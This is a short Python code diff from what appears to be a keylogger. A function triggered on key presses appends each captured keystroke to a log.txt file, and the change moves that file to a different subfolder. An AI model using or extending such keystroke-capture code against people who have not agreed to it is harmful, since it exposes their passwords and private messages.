@@ -10,7 +10,7 @@ def on_press(key):
 
 def write_key_to_file(key):
     global path
-    with open(path + "\\lib\\ss\\log.txt", "a") as f:
+    with open(path + "\\ss\\log.txt", "a") as f:
         k = str(key).replace("'", "")
         if k == "Key.space":
             f.write(" ")
